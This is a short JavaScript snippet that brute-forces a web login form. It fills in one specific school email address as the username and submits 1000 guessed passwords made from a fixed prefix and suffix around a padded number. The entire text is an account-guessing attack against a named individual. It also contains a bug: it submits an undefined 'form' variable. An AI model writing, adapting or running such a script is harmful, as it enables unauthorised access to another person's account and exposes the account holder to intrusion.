const loginForm = document.getElementById("logon")
const usernameBox = document.getElementById("j_username")
const passwordBox = document.getElementById("j_password")

for (let i=0; i < 1000; i++) {
  usernameBox.value = "26ponirosa@oceanschools.org"
  passwordBox.value = "OTISa7" + format(i) + "p"

  form.requestSubmit();
}

function format(integer) {
  let value = "00000" + integer
  return value.slice(-5)
}
